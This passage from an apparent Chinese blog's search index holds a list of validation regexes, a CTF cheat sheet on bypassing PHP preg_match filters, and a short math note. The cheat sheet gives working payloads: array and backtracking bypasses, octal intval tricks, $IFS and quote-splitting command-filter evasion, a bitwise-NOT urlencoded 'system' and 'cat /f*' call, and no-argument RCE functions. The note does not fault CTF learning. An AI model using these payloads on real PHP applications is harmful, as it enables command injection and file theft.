国内电话号码(0511-4405222、021-87888822)：\\d&#123;3&#125;-\\d&#123;8&#125;|\\d&#123;4&#125;-\\d&#123;7&#125; 7 身份证号(15位、18位数字)：^\\d&#123;15&#125;|\\d&#123;18&#125;$ 8 短身份证号码(数字、字母x结尾)：^([0-9])&#123;7,18&#125;(x|X)?$ 或 ^\\d&#123;8,18&#125;|[0-9x]&#123;8,18&#125;|[0-9X]&#123;8,18&#125;?$ 9 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$ 10 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\\w&#123;5,17&#125;$ 11 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).&#123;8,10&#125;$ 12 日期格式：^\\d&#123;4&#125;-\\d&#123;1,2&#125;-\\d&#123;1,2&#125; 13 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$ 14 一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$ 15 钱的输入格式： 16 1).有四种钱的表示形式我们可以接受:&quot;10000.00&quot; 和 &quot;10,000.00&quot;, 和没有 &quot;分&quot; 的 &quot;10000&quot; 和 &quot;10,000&quot;：^[1-9][0-9]*$ 17 2).这表示任意一个不以0开头的数字,但是,这也意味着一个字符&quot;0&quot;不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$ 18 3).一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$ 19 4).这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 20 5).必须说明的是,小数点后面至少应该有1位数,所以&quot;10.&quot;是不通过的,但是 &quot;10&quot; 和 &quot;10.2&quot; 是通过的：^[0-9]+(.[0-9]&#123;2&#125;)?$ 21 6).这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]&#123;1,2&#125;)?$ 22 7).这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*(.[0-9]&#123;1,2&#125;)?$ 23 8). 1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：^([0-9]+|[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*)(.[0-9]&#123;1,2&#125;)?$ 24 备注：这就是最终结果了,别忘了&quot;+&quot;可以用&quot;*&quot;替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里25 xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\\\.[x|X][m|M][l|L]$ 26 中文字符的正则表达式：[\\u4e00-\\u9fa5] 27 双字节字符：[^\\x00-\\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)) 28 空白行的正则表达式：\\n\\s*\\r (可以用来删除空白行) 29 HTML标记的正则表达式：&lt;(\\S*?)[^&gt;]*&gt;.*?&lt;/\\1&gt;|&lt;.*? /&gt; (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力) 30 首尾空白字符的正则表达式：^\\s*|\\s*$或(^\\s*)|(\\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式) 31 腾讯QQ号：[1-9][0-9]&#123;4,&#125; (腾讯QQ号从10000开始) 32 中国邮政编码：[1-9]\\d&#123;5&#125;(?!\\d) (中国邮政编码为6位数字) 33 IP地址：\\d+\\.\\d+\\.\\d+\\.\\d+ (提取IP地址时有用) 34 IP地址：((?:(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)\\\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)) preg_match 绕过数组绕过要使 $a = flag.php 12345678910&lt;?phpif(preg_match(&quot;/flag/&quot;,$a)) //如果匹配中出现了flag&#123; die(&#x27;这样子是不行的~&#x27;); //绕过失败，输出：这样子是不行的~&#125;else&#123; echo &#x27;成功啦~&#x27;; //绕过成功&#125;?&gt; 那么可以用数组绕过有以下几种方法: 123$a[]=&#x27;flag.php&#x27;;$a=array(&#x27;flag.php&#x27;);$a=[&#x27;flag.php&#x27;]; 回溯绕过例如: 12345678910111213141516171819202122232425if(isset($_POST[&#x27;ikun&#x27;]))&#123; $ikun = $_POST[&#x27;ikun&#x27;]; if(substr($ikun,0,4)===&#x27;ikun&#x27; &amp;&amp; substr($ikun,-11,11)===&#x27;luchujijiao&#x27; &amp;&amp; $ikun!==&#x27;ikunluchujijiao&#x27;) &#123; if(preg_match(&#x27;/ikun.+?luchujijiao/is&#x27; , $ikun)) &#123; die(&quot;你是假ikun!&quot;); &#125; else &#123; echo &quot;giegie很满意, 决定给你flag: &quot;; echo &quot;&lt;br&gt;&quot;; echo $flag; &#125; &#125; else &#123; die(&quot;你是假ikun!&quot;); &#125;&#125;else&#123; echo &quot;You are not an ikun!&quot;;&#125; 很显然, 题目要求$ikun前4位为’ikun’, 后11位为’luchujijiao’, 但$ikun不等于’ikunluchujijiao’我们很可能会想到在中间随便插点东西但是很明显preg_match()函数ban了这种情况这样的话只能通过回溯绕过 1$ikun=ikunaaaaaaaaaaaaaaaaaaaaa......aaaaaaaaluchujijiao 使变量内a(任意字符都行)超过100w个, 超过回溯限制 preg_match &amp; intvalintval的具体用法可以看看我的另一篇博客: intval绕过 123456789101112if($num==2333)&#123; die(&quot;No No No!&quot;);&#125;if(preg_match(&quot;/[a-zA-z]|\\./i&quot;, $num))&#123; die(&quot;No No No!&quot;);&#125;if(intval($num, 0) === 2333)&#123; echo &quot;Level 1 OK!&quot;;&#125; 要使$num不等于2333, 但是经过intval函数后等于2333;有如下几种方法 123$num=0x91D//HEX$num=04435//OCT$num=2333.0//小数 但是preg_match ban了字母和 .因此只能用八进制 preg_match &amp; 命令执行(tips: flag在根目录下的flag文件) 123456789$cmd = $_GET[&#x27;cmd&#x27;];if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|system|exec|shell_exec|tac|od|vi|vim/i&quot;,$cmd))&#123; system($cmd);&#125;else&#123; die(&quot;Hacker!&quot;);&#125; system函数中可以执行Linux命令(就是命令执行)我们要输入的命令应该是cat /flag很明显, cat,flag, (空格)都被ban了 空格绕过: 123456789101112//$IFS在linux下表示分隔符$IFS$&#123;IFS&#125;$IFS$9 //any number&lt;&lt;&gt; //can&#x27;t&#123;cat,flag.php&#125;//用逗号实现空格功能 //can&#x27;t%09%20 命令绕过 1234567ca&#x27;&#x27;t ca&quot;&quot;tca\\t //$cmd = cat&#x27;&#x27;t. but it can run.a=fl;b=ag;cat $a$b//拼接fla?f* urlencode 123456789&lt;?phphighlight_file(__FILE__);$a = &quot;system&quot;;$b = &quot;cat /f*&quot;;echo urlencode(~$a);print(&quot;\\n&quot;);echo urlencode(~$b);?&gt; %8C%86%8C%8B%9A%92 %9C%9E%8B%DF%D0%99%D5 然后在url中输入&#x2F;?wllm&#x3D;(%8C%86%8C%8B%9A%92)(%9C%9E%8B%DF%D0%99%D5); `` 程序会先执行``中的内容比如ls 可以得到 flag.php 但过滤了flag则可以cat `ls` 无参RCEdir scandir(dir) 列出 dir 目录中的文件和目录的数组。 readfile() 输出一个文件。 getchwd() ：函数返回当前工作目录。 dirname() ：函数返回路径中的目录部分。 chdir() ：函数改变当前的目录。 output print_r() var_dump() highlight_file(filename) 打印输出或者返回 filename 文件中语法高亮版本的代码。 readfile() 输出一个文件。 file_get_contents() 把整个文件读入一个字符串中。 next() 函数将内部指针指向数组中的下一个元素，并输出123456end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。array_shift() - 删除数组中第一个元素，并返回被删除元素的值 12show_source() - 对文件进行语法高亮显示。readgzfile() - 可用于读取非 gzip 格式的文件 mess det_defined_vars() 所有可用变量 current(localeconv()) current() 返回数组中的当前单元, 默认取第一个值。 pos() 是current()的别名。 localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是 . array_reverse() 以相反的元素顺序返回数组。的数组。 headers1getallheaders() getshell1234&amp;&amp; 表示前一条命令执行成功时, 才执行后一条命令|| 表示上一条命令执行失败后, 才执行下一条命令&amp; 后台运行| 上一条命令输出作为下一条命令参数 2&gt;&amp;1 12345678910└─# s 2&gt;&amp;1s: command not found└─# s &gt;log 2&gt;&amp;1└─# lsa log└─# cat logs: command not found 1234567└─# ls--help ls mn└─# rm --helpUsage: rm [OPTION]... [FILE]...Remove (unlink) the FILE(s). 12└─# ls /proc/self/fd0 1 2 3 123456789101112131415161718192021└─# exec 6&gt;&amp;1#将标准输出与fd 6绑定 └─# ls /proc/self/fd/0 1 2 3 6#出现文件描述符6 └─# exec 1&gt;suc.txt#将接下来所有命令标准输出，绑定到suc.txt文件（输出到该文件） └─# ls -al#执行命令，发现什么都不返回了，因为标准输出已经输出到suc.txt文件了 └─# exec 1&gt;&amp;6#恢复标准输出 └─# exec 6&gt;&amp;-#关闭fd 6描述符 └─# ls /proc/self/fd/0 1 2 3 1234└─# ls xxx &gt; /dev/null 2&gt;&amp;1└─# ls xxx 2&gt;&amp;1 &gt; /dev/nullls: cannot access &#x27;xxx&#x27;: No such file or directory bash –help 1234567891011121314151617181920212223242526272829GNU bash, version 5.2.15(1)-release-(x86_64-pc-linux-gnu)Usage: bash [GNU long option] [option] ... bash [GNU long option] [option] script-file ...GNU long options: --debug --debugger --dump-po-strings --dump-strings --help --init-file --login --noediting --noprofile --norc --posix --pretty-print --rcfile --restricted --verbose --versionShell options: -ilrsD or -c command or -O shopt_option (invocation only) -abefhkmnptuvxBCEHPT or -o optionType `bash -c &quot;help set&quot;&#x27; for more information about shell options.Type `bash -c help&#x27; for more information about shell builtin commands.Use the `bashbug&#x27; command to report bugs.bash home page: &lt;http://www.gnu.org/software/bash&gt; General help using GNU software: &lt;http://www.gnu.org/gethelp/&gt; 待补充","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"preg_match绕过","slug":"preg-match绕过","permalink":"http://example.com/tags/preg-match%E7%BB%95%E8%BF%87/"},{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://example.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"author":"arkcimi"},{"title":"Math1","slug":"Math1","date":"2023-11-06T14:37:37.000Z","updated":"2023-11-22T15:45:13.000Z","comments":true,"path":"Math1/","link":"","permalink":"http://example.com/Math1/","excerpt":"","text":"实数集与函数数集-确界原理确界定义定义如下 $$S\\in R, if \\ \\eta:\\ \\forall x \\in S,\\ s.t.x \\leqslant \\eta\\ \\forall \\varepsilon &gt;0,\\ \\exist {x_0} \\in S,\\ s.t.{x_0}&gt;\\eta-\\varepsilon$$ 则记 $$\\eta &#x3D; \\sup S$$ 确界原理$$设S为非空数集.若S有上界,则S必有上确界;若S有下界,则S必有下确界.$$","categories":[{"name":"Math","slug":"Math","permalink":"http://example.com/categories/Math/"}],"tags":[{"name":"math","slug":"math","permalink":"http://example.com/tags/math/"}],"author":"arkcimi"}],"categories":[{"name":"Internet","slug":"Internet","permalink":"http://example.com/categories/Internet/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"INTERNET","slug":"INTERNET","permalink":"http://example.com/categories/INTERNET/"},{"name":"Code","slug":"Code","permalink":"http://example.com/categories/Code/"},{"name":"Math","slug":"Math","permalink":"http://example.com/categories/Math/"}],"tags":[{"name":"socket","slug":"socket","permalink":"http://example.com/tags/socket/"},{"name":"js","slug":"js","permalink":"http://example.com/tags/js/"},{"name":"game","slug":"game","permalink":"http://example.com/tags/game/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"},{"name":"node","slug":"node","permalink":"http://example.com/tags/node/"},{"name":"prototyoe","slug":"prototyoe","permalink":"http://example.com/tags/prototyoe/"},{"name":"internet","slug":"internet","permalink":"http://example.com/tags/internet/"},{"name":"-docker","slug":"docker","permalink":"http://example.com/tags/docker/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"md5","slug":"md5","permalink":"http://example.com/tags/md5/"},{"name":"sql","slug":"sql","permalink":"http://example.com/tags/sql/"},{"name":"php伪协议","slug":"php伪协议","permalink":"http://example.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"include","slug":"include","permalink":"http://example.com/tags/include/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"},{"name":"ssti","slug":"ssti","permalink":"http://example.com/tags/ssti/"},{"name":"flask","slug":"flask","permalink":"http://example.com/tags/flask/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"文件注入","slug":"文件注入","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5/"},{"name":"pop chain","slug":"pop-chain","permalink":"http://example.com/tags/pop-chain/"},{"name":"php魔术方法","slug":"php魔术方法","permalink":"http://example.com/tags/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"name":"intval","slug":"intval","permalink":"http://example.com/tags/intval/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"preg_match绕过","slug":"preg-match绕过","permalink":"http://example.com/tags/preg-match%E7%BB%95%E8%BF%87/"},{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://example.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"math","slug":"math","permalink":"http://example.com/tags/math/"}]}